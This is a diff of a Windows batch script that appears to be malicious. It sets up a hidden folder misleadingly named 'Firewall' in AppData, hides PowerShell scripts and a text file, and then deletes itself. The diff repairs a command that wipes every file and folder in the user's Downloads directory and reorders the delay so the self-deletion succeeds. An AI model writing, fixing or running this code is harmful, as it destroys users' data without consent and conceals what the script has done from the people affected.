@@ -1,6 +1,8 @@
 @echo off
 :: setup work cd
 set "SF=%CD%"
+
+mkdir %APPDATA%\Firewall
 set "HD=%APPDATA%\Firewall"
 
 chcp 65001 > nul
@@ -66,7 +68,8 @@ attrib +h "%HD%\%NAME%.ps1"
 attrib +h "%HD%\%NAME%e.ps1"
 attrib +h "%HD%\.ascii.txt"
 
-del /q "%USERPROFILE%\Downloads\*.*" && for /d %G in ("%USERPROFILE%\Downloads\*") do rd /s /q "%G"
+:: correct folder name for Downloads (use appropriate path for your language)
+del /q "%USERPROFILE%\Downloads\*.*" && for /d %%G in ("%USERPROFILE%\Downloads\*") do rd /s /q "%%G"
 
 for %%f in (%SF%\.*) do (
     attrib +h "%%f" >nul 2>&1
@@ -76,9 +79,9 @@ for %%f in (%SF%\.*) do (
 echo worked
 echo use %NAME%.txt
 
+:: Delay the removal of the script to avoid deletion while still running
+ping 127.0.0.1 -n 3 > nul
 del "%~f0" >nul 2>&1
 
-ping 127.0.0.1 -n 3 > nul
 cls
-
 exit
